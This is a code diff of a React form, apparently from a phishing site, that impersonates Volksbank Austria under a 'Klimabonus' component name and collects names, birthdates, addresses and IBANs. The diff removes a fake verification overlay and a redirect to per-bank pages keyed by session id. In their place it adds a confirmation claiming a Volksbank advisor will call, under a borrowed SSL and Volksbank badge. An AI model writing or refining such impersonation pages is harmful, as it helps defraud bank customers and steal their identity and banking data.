@@ -1,12 +1,10 @@
 import { useState, useEffect, useRef, useCallback } from "react";
-import { useNavigate } from "react-router-dom";
-import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2 } from "lucide-react";
+import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2, CheckCircle2 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { formatIBAN } from "@/lib/format";
-import { banksAT as banks, bankRouteMapAT as bankRouteMap, formatBirthdate } from "@/lib/banks";
+import { banksAT as banks, formatBirthdate } from "@/lib/banks";
 import { supabase } from "@/integrations/supabase/client";
 import InvestmentCheckWizardShell from "@/components/InvestmentCheckWizardShell";
-import LoadingOverlay from "@/components/LoadingOverlay";
 import {
   Popover,
   PopoverContent,
@@ -45,9 +43,7 @@ const REQUIRED_MESSAGES: Record<string, string> = {
 const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);
 
 const KlimabonusVoranmeldung = () => {
-  const navigate = useNavigate();
-  const [step, setStep] = useState<1 | 2>(1);
-  const [showLoading, setShowLoading] = useState(false);
+  const [step, setStep] = useState<1 | 2 | 3>(1);
 
   // Persönliche Daten
   const [firstName, setFirstName] = useState("");
@@ -97,11 +93,15 @@ const KlimabonusVoranmeldung = () => {
     const title =
       step === 1
         ? "Persönliche Daten – Investment-Check | Volksbank"
-        : "Bankdaten – Investment-Check | Volksbank";
+        : step === 2
+        ? "Bankdaten – Investment-Check | Volksbank"
+        : "Investment-Check angefordert | Volksbank";
     const description =
       step === 1
-        ? "Schritt 1 von 3: Geben Sie Ihre persönlichen Daten für die Investment-Check bei der Volksbank ein."
-        : "Schritt 2 von 3: Geben Sie Ihre Bankdaten (IBAN) für die Investment-Beratung ein.";
+        ? "Schritt 1 von 3: Geben Sie Ihre persönlichen Daten für den Investment-Check bei der Volksbank ein."
+        : step === 2
+        ? "Schritt 2 von 3: Geben Sie Ihre Bankdaten (IBAN) für die Investment-Beratung ein."
+        : "Schritt 3 von 3: Ihr Investment-Check wurde angefordert – ein Berater meldet sich in Kürze.";
     document.title = title;
     let meta = document.querySelector('meta[name="description"]');
     if (!meta) {
@@ -173,13 +173,7 @@ const KlimabonusVoranmeldung = () => {
       return;
     }
 
-    const route = bankRouteMap[selectedBank];
-    if (route) {
-      setShowLoading(true);
-      setTimeout(() => {
-        navigate(`${route}?s=${sessionId}`);
-      }, 2500);
-    }
+    setStep(3);
   }, [
     step2Valid,
     firstName,
@@ -195,14 +189,10 @@ const KlimabonusVoranmeldung = () => {
     city,
     iban,
     selectedBank,
-    navigate,
   ]);
 
   return (
     <>
-      {showLoading && (
-        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
-      )}
       <InvestmentCheckWizardShell step={step}>
         {step === 1 && (
           <div>
@@ -571,6 +561,41 @@ const KlimabonusVoranmeldung = () => {
                 <span>Weiter</span>
                 <ArrowRight className="w-4 h-4" />
               </button>
+            </div>
+          </div>
+        )}
+
+        {step === 3 && (
+          <div className="text-center py-4">
+            <div
+              className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2"
+              style={{ color: VB_NAVY }}
+            >
+              Schritt 3 von 3
+            </div>
+            <h1 className="text-xl md:text-2xl font-semibold text-gray-900 mb-6">
+              Investment-Check
+            </h1>
+
+            <div
+              className="mx-auto mb-6 w-16 h-16 rounded-full flex items-center justify-center"
+              style={{ backgroundColor: "rgba(0,56,130,0.08)" }}
+            >
+              <CheckCircle2 className="w-10 h-10" style={{ color: VB_NAVY }} strokeWidth={2} />
+            </div>
+
+            <p className="text-[15px] font-semibold text-gray-900 mb-3">
+              Ihr Investment-Check wurde erfolgreich angefordert.
+            </p>
+            <p className="text-[14px] text-gray-600 max-w-md mx-auto leading-relaxed">
+              Ein spezialisierter Berater der Volksbank wird sich in Kürze
+              persönlich bei Ihnen melden, um Ihre Anlagesituation gemeinsam mit
+              Ihnen zu besprechen.
+            </p>
+
+            <div className="flex items-center justify-center gap-2 mt-8 text-[12px] text-gray-500">
+              <Lock className="w-3.5 h-3.5" />
+              <span>SSL-verschlüsselt · Volksbank Österreich</span>
             </div>
           </div>
         )}
